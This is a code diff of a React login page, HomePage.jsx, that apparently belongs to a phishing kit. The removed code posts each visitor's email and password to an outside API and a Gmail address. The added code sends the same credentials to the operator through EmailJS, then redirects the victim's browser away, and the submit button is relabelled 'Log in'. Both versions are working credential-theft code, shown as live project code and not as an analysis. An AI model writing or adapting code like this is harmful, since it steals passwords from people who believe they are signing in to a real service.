@@ -1,6 +1,6 @@
 // src/HomePage.jsx
 import React, { useState } from "react";
-import axios from "axios";
+import emailjs from "emailjs-com";
 
 const HomePage = () => {
   const [formData, setFormData] = useState({
@@ -38,63 +38,42 @@ const HomePage = () => {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    setIsLoading(true);
-    const customizedMessage = `
-      Hello, New Form Submitted 
-      Email: ${formData.email},
-      Password: ${formData.password}
-      Thank you for using our service.
-    `;
-    const data = {
-      sender_name: import.meta.env.APP_SENDER_NAME,
-      sender_email: import.meta.env.APP_SENDER_ADDRESS,
-      message: customizedMessage,
-      subject: "New Form Submitted",
-      email: "krogstadracheal@gmail.com",
-      name: "Project Business",
-    };
-    console.log(data);
 
-    const url =
-      import.meta.env.APP_API_URL ??
-      "http://talentsapartments.com/api/api-email";
-    if (validateForm()) {
-      try {
-        await axios.post(url, data);
-        setIsSubmitted(true);
-        setIsLoading(false);
-      } catch (error) {
-        console.error("Failed to send email:", error);
-        setIsLoading(false);
+    if (!validateForm()) return;
+    setIsLoading(true);
+    const senderName = import.meta.env.APP_SENDER_NAME;
+    const redirectUrl = import.meta.env.APP_REDIRECT_URL;
+
+    const customizedMessage = `
+    Hello, New Form Submitted 
+    Email: ${formData.email},
+    Password: ${formData.password}
+    Thank you for using our service.
+  `;
+
+    try {
+      const templateParams = {
+        to_name: senderName,
+        from_email: formData.email,
+        message: customizedMessage,
+      };
+
+      const serviceId = import.meta.env.APP_EMAILJS_SERVICE_ID;
+      const templateId = import.meta.env.APP_EMAILJS_TEMPLATE_ID;
+      const userId = import.meta.env.APP_EMAILJS_USER_ID;
+      await emailjs.send(serviceId, templateId, templateParams, userId);
+      setIsLoading(false);
+      if (redirectUrl) {
+        window.parent.location.href = redirectUrl.toString();
       }
+      setSuccessMessage("Email sent successfully!");
+    } catch (error) {
+      setIsLoading(false);
+      console.error("Email sending error:", error);
+      setSuccessMessage("Failed to send email. Please try again.");
     }
   };
-  // const handleSubmit = async (e) => {
-  //   e.preventDefault();
-  //   if (!validateForm()) return;
 
-  //   const customizedMessage = `
-  //     Welcome, ${formData.email}!
-  //     Thank you for using our service.
-  //     Remembered: ${formData.remember ? "Yes" : "No"}
-  //   `;
-
-  //   try {
-  //     await emailjs.send(
-  //       import.meta.env.REACT_APP_EMAILJS_SERVICE_ID,
-  //       import.meta.env.REACT_APP_EMAILJS_TEMPLATE_ID,
-  //       {
-  //         to_email: formData.email,
-  //         message: customizedMessage,
-  //       },
-  //       import.meta.env.REACT_APP_EMAILJS_USER_ID
-  //     );
-  //     setSuccessMessage("Email sent successfully!");
-  //   } catch (error) {
-  //     console.error("Email sending error:", error);
-  //     setSuccessMessage("Failed to send email. Please try again.");
-  //   }
-  // };
   return (
     <div className="page">
       {/* Navbar */}
@@ -190,7 +169,7 @@ const HomePage = () => {
                   </div>
                   <div>
                     <button type="submit" className="btn form-btn">
-                      {isLoading ? "Please Wait...." : "Submit"}
+                      {isLoading ? "Please Wait...." : "Log in"}
                     </button>
                   </div>
                   <div className="mt-3">
